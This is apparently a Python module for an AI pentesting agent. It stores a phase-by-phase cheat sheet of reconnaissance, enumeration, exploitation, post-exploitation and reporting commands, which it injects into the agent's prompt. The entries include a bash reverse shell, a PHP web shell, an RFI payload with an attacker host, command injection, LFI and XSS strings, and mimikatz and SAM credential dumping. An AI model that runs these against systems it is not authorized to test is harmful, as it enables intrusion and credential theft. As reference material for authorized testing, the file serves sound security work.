"""Static Knowledge Base — hardcoded pentesting knowledge organized by VAPT phase.

This is a zero-dependency, zero-VRAM knowledge base that provides the agent
with relevant pentesting knowledge based on the current VAPT phase. Content
covers tool usage, common techniques, cheat-sheet tips, and methodology
guidance drawn from standard pentesting practices (OWASP, MITRE ATT&CK
concepts, Kali Linux tooling).
"""

from typing import List, Dict, Optional


# ── Knowledge entries organized by VAPT phase ────────────────────────────────

KNOWLEDGE_BASE: Dict[str, List[Dict[str, str]]] = {
    # ═══════════════════════════════════════════════════════════════════════
    "reconnaissance": [
        {
            "title": "Passive Recon — OSINT",
            "content": (
                "• whois <domain> — registrant info, nameservers, dates\n"
                "• dig <domain> ANY — DNS records (A, MX, NS, TXT, CNAME)\n"
                "• host -t ns <domain> | host -t mx <domain>\n"
                "• theHarvester -d <domain> -b all — emails, subdomains, IPs\n"
                "• subfinder -d <domain> -o subs.txt — fast subdomain enum\n"
                "• amass enum -passive -d <domain>\n"
                "• Google dorks: site: inurl: intitle: filetype: ext:php\n"
                "• Shodan: shodan search hostname:<domain>\n"
                "• Censys, crt.sh (cert transparency logs) for subdomains"
            ),
            "tags": "osint passive dns whois subdomain google dork shodan",
        },
        {
            "title": "Active Recon — Network Scanning",
            "content": (
                "• nmap -sn <CIDR> — host discovery (ping sweep)\n"
                "• nmap -sS -sV -O -p- <target> — full TCP SYN scan + versions + OS\n"
                "• nmap -sU --top-ports 100 <target> — UDP scan (slow, top ports)\n"
                "• nmap -sC -sV -oA scan <target> — default scripts + version detection\n"
                "• nmap --script vuln <target> — vulnerability scan scripts\n"
                "• masscan -p0-65535 --rate 1000 <target> — ultra-fast port scan\n"
                "• Tip: Always save output with -oA for later parsing\n"
                "• Tip: Use -Pn if host blocks ping (common on Windows)\n"
                "• Tip: Start fast (top-1000), go deep (-p-) when needed"
            ),
            "tags": "nmap masscan scan ports tcp udp syn network host discovery",
        },
        {
            "title": "Web Recon",
            "content": (
                "• whatweb <url> — quick technology fingerprint\n"
                "• wappalyzer (browser) — CMS, frameworks, server tech\n"
                "• curl -I <url> — response headers (server, x-powered-by)\n"
                "• robots.txt, sitemap.xml — often reveal hidden paths\n"
                "• SSL/TLS: sslscan <host> | testssl.sh <url>\n"
                "• WAF detection: wafw00f <url>\n"
                "• Screenshot: gowitness single <url>"
            ),
            "tags": "web whatweb curl headers ssl waf fingerprint technology",
        },
    ],

    # ═══════════════════════════════════════════════════════════════════════
    "enumeration": [
        {
            "title": "Directory & File Enumeration",
            "content": (
                "• gobuster dir -u <url> -w /usr/share/wordlists/dirb/common.txt -t 50\n"
                "• ffuf -u <url>/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt\n"
                "• feroxbuster -u <url> -w <wordlist> --depth 2 --force-recursion\n"
                "• dirsearch -u <url> -e php,asp,aspx,jsp,html,js\n"
                "• Wordlists: /usr/share/seclists/ (SecLists), /usr/share/wordlists/ (Kali)\n"
                "• Tip: Use -x php,txt,bak,old for extension fuzzing\n"
                "• Tip: Filter by size/status to reduce false positives: -fs 0 or -fc 404"
            ),
            "tags": "gobuster ffuf dirsearch directory file brute wordlist fuzz",
        },
        {
            "title": "Service Enumeration",
            "content": (
                "• SMB: enum4linux -a <target> | smbclient -L //<target> -N\n"
                "• SMB: crackmapexec smb <target> --shares\n"
                "• SNMP: snmpwalk -v2c -c public <target>\n"
                "• LDAP: ldapsearch -H ldap://<target> -x -b 'DC=domain,DC=local'\n"
                "• NFS: showmount -e <target>\n"
                "• DNS zone transfer: dig axfr @<ns> <domain>\n"
                "• SMTP: smtp-user-enum -M VRFY -U users.txt -t <target>\n"
                "• RPC: rpcclient -U '' <target> -N (then enumdomusers, enumdomgroups)"
            ),
            "tags": "smb enum4linux snmp ldap nfs dns smtp rpc service",
        },
        {
            "title": "Web Application Enumeration",
            "content": (
                "• nikto -h <url> — web vulnerability scanner\n"
                "• Burp Suite passive spider + active scan\n"
                "• API enum: ffuf -u <url>/api/FUZZ -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt\n"
                "• Parameter discovery: arjun -u <url>\n"
                "• CMS scanners: wpscan --url <url> (WordPress), droopescan (Drupal/Joomla)\n"
                "• JavaScript source review for API keys, endpoints, secrets\n"
                "• Check for common files: .env, .git/, .DS_Store, backup.zip, wp-config.php.bak"
            ),
            "tags": "nikto burp api parameter cms wpscan web application",
        },
    ],

    # ═══════════════════════════════════════════════════════════════════════
    "vulnerability_analysis": [
        {
            "title": "Web Vulnerabilities — OWASP Top 10",
            "content": (
                "A01: Broken Access Control — IDOR, privilege escalation, path traversal\n"
                "A02: Cryptographic Failures — weak TLS, cleartext passwords, weak hashes\n"
                "A03: Injection — SQLi, command injection, LDAP injection, XSS\n"
                "A04: Insecure Design — missing rate limits, business logic flaws\n"
                "A05: Security Misconfiguration — default creds, verbose errors, open cloud storage\n"
                "A06: Vulnerable Components — outdated libraries, known CVEs\n"
                "A07: Auth Failures — weak passwords, session fixation, credential stuffing\n"
                "A08: Software Integrity — unsigned updates, CI/CD pipeline attacks\n"
                "A09: Logging Failures — no audit trail, log injection\n"
                "A10: SSRF — server-side request forgery to internal services"
            ),
            "tags": "owasp top10 injection xss sqli ssrf idor access control web",
        },
        {
            "title": "SQL Injection Testing",
            "content": (
                "• Manual: ' OR 1=1-- | ' UNION SELECT null,null-- | SLEEP(5)\n"
                "• sqlmap -u '<url>?id=1' --batch --dbs — auto SQLi detection\n"
                "• sqlmap --forms -u <url> — test all forms\n"
                "• sqlmap -r request.txt — test from saved Burp request\n"
                "• sqlmap --os-shell — get OS shell via SQLi\n"
                "• Blind SQLi: boolean-based, time-based, error-based\n"
                "• Bypass WAF: --tamper=space2comment,between,randomcase\n"
                "• NoSQLi: {\"$gt\":\"\"}, {\"$ne\":\"\"} in JSON parameters"
            ),
            "tags": "sqli sql injection sqlmap blind union nosql database",
        },
        {
            "title": "Vulnerability Scanners & CVE Research",
            "content": (
                "• nmap --script vuln <target> — NSE vulnerability scripts\n"
                "• searchsploit <product> <version> — local ExploitDB search\n"
                "• searchsploit -m <exploit-id> — mirror exploit to current dir\n"
                "• CVE databases: cvedetails.com, nvd.nist.gov, exploit-db.com\n"
                "• nuclei -u <url> -t cves/ — template-based vuln testing\n"
                "• Version-based vuln checking: match service+version against known CVEs\n"
                "• Tip: Always verify scanner findings manually before reporting"
            ),
            "tags": "vulnerability scan cve searchsploit exploit nuclei nmap nse",
        },
        {
            "title": "XSS and Client-Side Attacks",
            "content": (
                "• Reflected XSS: <script>alert(1)</script> in URL params\n"
                "• Stored XSS: inject in comments, profiles, form fields\n"
                "• DOM XSS: check JavaScript sinks (innerHTML, document.write)\n"
                "• Payloads: <img src=x onerror=alert(1)> | <svg onload=alert(1)>\n"
                "• Tools: dalfox -u <url> | XSStrike\n"
                "• WAF bypass: encoding, case variation, event handlers\n"
                "• CSRF: check for missing anti-CSRF tokens on state-changing requests"
            ),
            "tags": "xss cross site scripting csrf dom reflected stored client side",
        },
    ],

    # ═══════════════════════════════════════════════════════════════════════
    "exploitation": [
        {
            "title": "Metasploit Framework",
            "content": (
                "• msfconsole — start Metasploit\n"
                "• search <keyword> — find exploits/payloads\n"
                "• use <module> → set RHOSTS <target> → set PAYLOAD <payload> → exploit\n"
                "• Common payloads: windows/meterpreter/reverse_tcp, linux/x64/shell_reverse_tcp\n"
                "• Post-exploitation modules: post/multi/gather/*, post/windows/gather/*\n"
                "• msfvenom -p <payload> LHOST=<ip> LPORT=<port> -f <format> -o shell.exe\n"
                "• Multi/handler: use exploit/multi/handler → set payload → exploit -j\n"
                "• Tip: Use staged payloads for reliability, stageless for speed"
            ),
            "tags": "metasploit msfconsole msfvenom exploit payload meterpreter handler",
        },
        {
            "title": "Password Attacks",
            "content": (
                "• hydra -l <user> -P <wordlist> <target> <service> — online brute force\n"
                "• hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://<target>\n"
                "• hydra ftp://<target> http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'\n"
                "• crackmapexec smb <target> -u <user> -p <password> — SMB auth check\n"
                "• john --wordlist=rockyou.txt hashes.txt — offline hash cracking\n"
                "• hashcat -m <mode> hashes.txt rockyou.txt — GPU hash cracking\n"
                "• Hash identification: hashid <hash> | hash-identifier\n"
                "• Common modes: 0=MD5, 100=SHA1, 1000=NTLM, 1800=sha512crypt, 3200=bcrypt"
            ),
            "tags": "hydra password brute force crack john hashcat hash credential",
        },
        {
            "title": "Shells & Reverse Shells",
            "content": (
                "• Bash: bash -i >& /dev/tcp/<ip>/<port> 0>&1\n"
                "• Python: python3 -c 'import socket,subprocess,os;...'\n"
                "• PHP: <?php system($_GET['cmd']); ?>\n"
                "• Netcat listener: nc -lvnp <port>\n"
                "• Upgrade shell: python3 -c 'import pty;pty.spawn(\"/bin/bash\")'\n"
                "• Then: Ctrl+Z → stty raw -echo; fg → export TERM=xterm\n"
                "• Reverse shell generator: revshells.com\n"
                "• Web shells: /usr/share/webshells/ (Kali)\n"
                "• File transfer: python3 -m http.server | wget | curl | certutil (Windows)"
            ),
            "tags": "shell reverse bind netcat nc listener bash python php web upload",
        },
        {
            "title": "Web Exploitation Techniques",
            "content": (
                "• File upload bypass: change extension (.php → .pHp, .php5), add magic bytes\n"
                "• LFI: ../../../../etc/passwd | php://filter/convert.base64-encode/resource=index.php\n"
                "• RFI: http://<attacker>/shell.php\n"
                "• Command injection: ; id | $(id) | `id` | || id | && id\n"
                "• SSRF: http://127.0.0.1, http://169.254.169.254 (cloud metadata)\n"
                "• JWT attacks: none algorithm, weak secret (jwt_tool)\n"
                "• Deserialization: ysoserial (Java), pickle (Python)"
            ),
            "tags": "lfi rfi file inclusion upload command injection ssrf jwt deserialization",
        },
    ],

    # ═══════════════════════════════════════════════════════════════════════
    "post_exploitation": [
        {
            "title": "Linux Post-Exploitation",
            "content": (
                "• Situational Awareness: id, whoami, hostname, uname -a, cat /etc/os-release\n"
                "• Users: cat /etc/passwd, cat /etc/shadow (if root), last, w\n"
                "• Network: ip a, ss -tlnp, netstat -antp, route -n, arp -a\n"
                "• Processes: ps aux, pstree, crontab -l, ls /etc/cron.d/\n"
                "• Privilege Escalation checks:\n"
                "  - sudo -l (sudo rights)\n"
                "  - find / -perm -4000 2>/dev/null (SUID binaries → GTFOBins)\n"
                "  - find / -writable -type f 2>/dev/null\n"
                "  - ls -la /etc/passwd /etc/shadow (writable?)\n"
                "  - cat /etc/crontab (writable cron jobs?)\n"
                "  - linpeas.sh | linux-exploit-suggester.sh — automated enumeration\n"
                "• Tools: linPEAS, LinEnum, pspy (process snoop)"
            ),
            "tags": "linux post exploitation privilege escalation suid sudo cron linpeas",
        },
        {
            "title": "Windows Post-Exploitation",
            "content": (
                "• Situational Awareness: whoami /all, systeminfo, hostname, ipconfig /all\n"
                "• Users: net user, net localgroup administrators, net user /domain\n"
                "• Network: netstat -an, arp -a, route print\n"
                "• Privilege Escalation checks:\n"
                "  - whoami /priv (SeImpersonatePrivilege → Potato exploits)\n"
                "  - winPEAS.exe — automated enumeration\n"
                "  - PowerUp.ps1 — service misconfigs, unquoted paths\n"
                "  - AccessChk.exe — check writable directories/services\n"
                "• Credential harvesting:\n"
                "  - mimikatz: sekurlsa::logonpasswords\n"
                "  - reg save hklm\\sam sam | reg save hklm\\system system\n"
                "  - secretsdump.py <user>:<pass>@<target>\n"
                "• Lateral movement: psexec, wmiexec, evil-winrm, crackmapexec"
            ),
            "tags": "windows post exploitation privilege escalation mimikatz lateral movement",
        },
        {
            "title": "Persistence & Data Exfiltration",
            "content": (
                "• Linux persistence: SSH keys, cron jobs, bashrc, systemd services\n"
                "• Windows persistence: scheduled tasks, registry run keys, services\n"
                "• Data exfil: tar + base64 | nc, scp, HTTP POST, DNS tunneling\n"
                "• Pivot: sshuttle, chisel, ligolo-ng, ssh -D (SOCKS proxy)\n"
                "• Tip: Always document what you do for the report\n"
                "• Tip: Clean up after testing (remove shells, backdoors, test files)"
            ),
            "tags": "persistence pivot tunnel exfiltration lateral sshuttle chisel",
        },
    ],

    # ═══════════════════════════════════════════════════════════════════════
    "reporting": [
        {
            "title": "Report Structure",
            "content": (
                "Standard pentest report sections:\n"
                "1. Executive Summary — high-level business impact\n"
                "2. Scope & Methodology — what was tested and how\n"
                "3. Findings — severity, description, evidence, remediation\n"
                "4. Risk Rating — CVSS scores, business context\n"
                "5. Recommendations — prioritized remediation steps\n"
                "6. Appendix — raw scan outputs, tool configurations\n"
                "\n"
                "Severity classification:\n"
                "• Critical: RCE, auth bypass, full system compromise\n"
                "• High: SQLi, privilege escalation, sensitive data exposure\n"
                "• Medium: XSS, CSRF, information disclosure\n"
                "• Low: verbose errors, missing headers, version disclosure\n"
                "• Info: SSL configuration, open ports with no impact"
            ),
            "tags": "report structure severity cvss findings remediation executive summary",
        },
        {
            "title": "Evidence Collection",
            "content": (
                "• Always save tool outputs: nmap -oA, gobuster -o, sqlmap --output-dir\n"
                "• Take screenshots of key findings (XSS popups, admin access, etc.)\n"
                "• Document exact reproduction steps for each vulnerability\n"
                "• Include request/response pairs from Burp\n"
                "• CVA commands: /report md|html|both to generate reports\n"
                "• Use /findings to review tracked findings before generating"
            ),
            "tags": "evidence screenshot command history proof of concept report",
        },
    ],

    # ═══════════════════════════════════════════════════════════════════════
    "general": [
        {
            "title": "VAPT Methodology Overview",
            "content": (
                "Standard phases:\n"
                "1. Pre-engagement — scope, rules of engagement, authorization\n"
                "2. Reconnaissance — passive OSINT + active network scanning\n"
                "3. Enumeration — deep service, directory, and user enumeration\n"
                "4. Vulnerability Analysis — identify weaknesses and CVEs\n"
                "5. Exploitation — validate vulnerabilities with controlled exploits\n"
                "6. Post-Exploitation — assess impact, pivot, escalate privileges\n"
                "7. Reporting — document findings with evidence and remediation\n"
                "\n"
                "Key principles:\n"
                "• Stay in scope, document everything\n"
                "• Start broad, go deep on interesting findings\n"
                "• Verify scanner output manually before reporting"
            ),
            "tags": "methodology vapt phases lifecycle pentest process",
        },
        {
            "title": "Common Default Credentials",
            "content": (
                "• SSH/FTP: root:root, admin:admin, user:password\n"
                "• Web apps: admin:admin, admin:password, test:test\n"
                "• MySQL: root:<empty>, root:root\n"
                "• PostgreSQL: postgres:postgres\n"
                "• MongoDB: (no auth by default)\n"
                "• Tomcat: tomcat:tomcat, admin:admin, manager:manager\n"
                "• Jenkins: admin:<check /var/lib/jenkins/secrets/initialAdminPassword>\n"
                "• phpMyAdmin: root:<empty>\n"
                "• SNMP community: public, private\n"
                "• Default credential databases: cirt.net, default-password.info"
            ),
            "tags": "default credentials password login common admin",
        },
        {
            "title": "Useful Wordlists",
            "content": (
                "• /usr/share/wordlists/rockyou.txt — passwords (14M)\n"
                "• /usr/share/seclists/Discovery/Web-Content/common.txt — dirs\n"
                "• /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt\n"
                "• /usr/share/seclists/Usernames/top-usernames-shortlist.txt\n"
                "• /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt\n"
                "• /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt\n"
                "• /usr/share/seclists/Fuzzing/ — fuzzing payloads (XSS, SQLi, etc.)\n"
                "• Custom: cewl -d 2 -m 5 <url> -w custom_wordlist.txt"
            ),
            "tags": "wordlist seclists rockyou password directory fuzzing",
        },
    ],
}


# ── Phase name normalization ─────────────────────────────────────────────────

_PHASE_ALIASES = {
    "recon": "reconnaissance",
    "reconnaissance": "reconnaissance",
    "enum": "enumeration",
    "enumeration": "enumeration",
    "vuln": "vulnerability_analysis",
    "vulnerability": "vulnerability_analysis",
    "vulnerability_analysis": "vulnerability_analysis",
    "exploit": "exploitation",
    "exploitation": "exploitation",
    "post": "post_exploitation",
    "post_exploitation": "post_exploitation",
    "post-exploitation": "post_exploitation",
    "report": "reporting",
    "reporting": "reporting",
}


class StaticKB:
    """Zero-dependency pentesting knowledge base with keyword search."""

    def get_phase_knowledge(self, phase: str) -> str:
        """Get all knowledge entries for a VAPT phase.

        Args:
            phase: Phase name (accepts aliases like 'recon', 'vuln', etc.)

        Returns:
            Formatted knowledge string for prompt injection.
        """
        normalized = _PHASE_ALIASES.get(phase.lower().strip(), phase.lower().strip())
        entries = KNOWLEDGE_BASE.get(normalized, [])
        if not entries:
            return ""

        lines = [f"[KNOWLEDGE — {normalized.replace('_', ' ').title()}]"]
        for entry in entries:
            lines.append(f"\n### {entry['title']}")
            lines.append(entry["content"])
        return "\n".join(lines)

    def search(self, query: str, limit: int = 5) -> List[Dict[str, str]]:
        """Search all knowledge entries by keyword matching.

        Args:
            query: Search terms (space-separated, any match counts)
            limit: Max results to return

        Returns:
            List of matching entries with title, content, and phase.
        """
        terms = query.lower().split()
        results = []

        for phase, entries in KNOWLEDGE_BASE.items():
            for entry in entries:
                # Score: count how many query terms appear in tags + title + content
                haystack = f"{entry.get('tags', '')} {entry['title']} {entry['content']}".lower()
                score = sum(1 for t in terms if t in haystack)
                if score > 0:
                    results.append({
                        "title": entry["title"],
                        "content": entry["content"],
                        "phase": phase,
                        "score": score,
                    })

        results.sort(key=lambda r: r["score"], reverse=True)
        return results[:limit]

    def get_context_for_agent(self, phase: str, query: str = "") -> str:
        """Get combined knowledge for agent prompt injection.

        Returns phase-specific knowledge plus any query-matched extras.
        """
        parts = []

        # Phase-specific knowledge
        phase_kb = self.get_phase_knowledge(phase)
        if phase_kb:
            parts.append(phase_kb)

        # General knowledge (always useful)
        if phase != "general":
            general_kb = self.get_phase_knowledge("general")
            if general_kb:
                parts.append(general_kb)

        # Query-matched extras from other phases
        if query:
            hits = self.search(query, limit=2)
            extras = []
            for hit in hits:
                if hit["phase"] != _PHASE_ALIASES.get(phase.lower(), phase.lower()):
                    extras.append(f"### {hit['title']} ({hit['phase']})\n{hit['content']}")
            if extras:
                parts.append("[ADDITIONAL KNOWLEDGE]\n" + "\n\n".join(extras))

        return "\n\n".join(parts)
